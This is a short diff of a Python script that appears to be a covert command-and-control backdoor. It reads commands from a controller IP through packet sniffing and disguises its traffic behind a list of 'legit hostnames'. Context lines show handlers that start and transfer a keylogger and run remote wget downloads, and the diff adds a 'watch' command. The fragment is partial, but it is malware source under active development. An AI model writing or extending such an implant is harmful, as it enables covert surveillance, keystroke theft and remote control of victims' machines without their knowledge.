@@ -49,6 +49,7 @@ CONTROLLER_IP = ARGS.controller_ip
 NETWORK_INTERFACE = ARGS.interface
 ENCRYPTION_HANDLER = StreamEncryption()
 
+
 # List of legit hostnames
 HOSTNAMES = ["play.google.com",
              "pixel.33across.com",
@@ -174,6 +175,8 @@ def packet_handler(pkt):
                 print("Start the keylogger!")
             if argv[1] == TRANSFER:
                 print("Transfer the keylogger!")
+        if argv[0] == WATCH:
+            print(f"watch {argv[1]}")
     if argc == 3:
         if argv[0] == WGET:
             execute_wget_command(argv[1], argv[2])
